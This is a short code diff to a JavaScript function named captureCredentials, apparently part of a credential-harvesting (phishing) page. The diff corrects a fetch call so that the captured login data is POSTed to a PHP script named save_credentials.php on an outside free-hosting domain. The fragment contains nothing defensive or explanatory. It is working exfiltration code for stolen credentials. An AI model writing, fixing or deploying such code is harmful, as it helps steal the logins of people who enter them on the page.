@@ -41,7 +41,7 @@ function captureCredentials(event) {
     };
     
     // Send data to InfinityFree PHP script
-    fetch('grix.fwh.is', {
+    fetch('https://grix.fwh.is/save_credentials.php', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json',
